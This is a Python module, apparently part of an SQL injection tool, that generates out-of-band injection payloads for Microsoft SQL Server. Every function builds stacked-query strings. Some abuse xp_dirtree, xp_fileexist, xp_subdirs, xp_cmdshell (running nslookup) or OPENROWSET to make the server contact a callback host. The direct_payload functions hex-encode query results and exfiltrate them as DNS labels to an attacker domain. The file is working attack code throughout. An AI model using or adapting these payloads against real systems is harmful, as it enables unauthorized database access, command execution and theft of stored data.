def substring(name: str, expression: str, pos: int) -> str:
    return f"SUBSTRING(({expression}),{pos},1)"


def _openrowset_action(condition: str, callback_host: str, provider: str) -> str:
    inner = (
        f"SELECT * FROM OPENROWSET("
        f"''{provider}'',"
        f"''Server={callback_host};UID=a;PWD=a;'',"
        f"''SELECT 1'')"
    )
    return f"IF ({condition}) EXEC('{inner}')"


def payload(name: str, base: str, condition: str, callback_host: str) -> str:
    if name == "mssql":
        return (
            f"{base}';IF ({condition}) "
            f"EXEC master..xp_dirtree '\\\\{callback_host}\\x'-- -"
        )
    if name == "mssql-cmdshell":
        return (
            f"{base}';IF ({condition}) "
            f"EXEC master..xp_cmdshell 'nslookup {callback_host}'/*"
        )
    if name == "mssql-openrowset":
        return f"{base}';{_openrowset_action(condition, callback_host, 'SQLNCLI')}-- -"
    raise ValueError(f"unknown profile: {name}")


def payloads_full(name: str, base: str, condition: str, callback_host: str) -> list[str]:
    if name == "mssql":
        variants = []
        for proc in ("xp_dirtree", "xp_fileexist", "xp_subdirs"):
            variants.extend([
                f"{base}';IF ({condition}) EXEC master..{proc} '\\\\{callback_host}\\x'-- -",
                f"{base}';IF ({condition}) EXEC master..{proc} '\\\\{callback_host}\\x'/*",
            ])
        return list(dict.fromkeys(variants))
    if name == "mssql-cmdshell":
        return list(dict.fromkeys([
            f"{base}';IF ({condition}) EXEC master..xp_cmdshell 'nslookup {callback_host}'-- -",
            f"{base}';IF ({condition}) EXEC master..xp_cmdshell 'nslookup {callback_host}'/*",
        ]))
    if name == "mssql-openrowset":
        variants = []
        for provider in ("SQLNCLI", "MSOLEDBSQL", "SQLOLEDB"):
            action = _openrowset_action(condition, callback_host, provider)
            variants.extend([
                f"{base}';{action}-- -",
                f"{base}';{action}/*",
            ])
        return list(dict.fromkeys(variants))
    raise ValueError(f"unknown profile: {name}")


def direct_payload(name: str, base: str, expression: str, prefix: str, domain: str) -> str | None:
    if name not in ("mssql", "mssql-cmdshell"):
        return None
    host = f"{prefix}.{domain}"
    h = f"CONVERT(VARCHAR(MAX),CONVERT(VARBINARY(MAX),({expression})),2)"
    split = (
        f"SUBSTRING({h},1,62)"
        f"+CASE WHEN LEN({h})>62 THEN '.'+SUBSTRING({h},63,62) ELSE '' END"
        f"+CASE WHEN LEN({h})>124 THEN '.'+SUBSTRING({h},125,62) ELSE '' END"
        f"+CASE WHEN LEN({h})>186 THEN '.'+SUBSTRING({h},187,62) ELSE '' END"
    )
    if name == "mssql-cmdshell":
        return f"{base}'; EXEC master..xp_cmdshell 'nslookup '+{split}+'.{host}'/*"
    return f"{base}'; DECLARE @o NVARCHAR(MAX); SET @o='\\\\'+{split}+'.{host}\\x'; EXEC master..xp_dirtree @o-- -"


def direct_payloads_full(
    name: str, base: str, expression: str, prefix: str, domain: str, payload: str
) -> list[str]:
    host = f"{prefix}.{domain}"
    if name == "mssql":
        h = f"CONVERT(VARCHAR(MAX),CONVERT(VARBINARY(MAX),({expression})),2)"
        split = (
            f"SUBSTRING({h},1,62)"
            f"+CASE WHEN LEN({h})>62 THEN '.'+SUBSTRING({h},63,62) ELSE '' END"
            f"+CASE WHEN LEN({h})>124 THEN '.'+SUBSTRING({h},125,62) ELSE '' END"
            f"+CASE WHEN LEN({h})>186 THEN '.'+SUBSTRING({h},187,62) ELSE '' END"
        )
        variants = [
            payload,
            f"{base}'; DECLARE @o NVARCHAR(MAX); SET @o='\\\\'+{split}+'.{host}\\x'; EXEC master..xp_fileexist @o-- -",
            f"{base}'; DECLARE @o NVARCHAR(MAX); SET @o='\\\\'+{split}+'.{host}\\x'; EXEC master..xp_subdirs @o-- -",
        ]
        return list(dict.fromkeys(variants))
    return [payload]
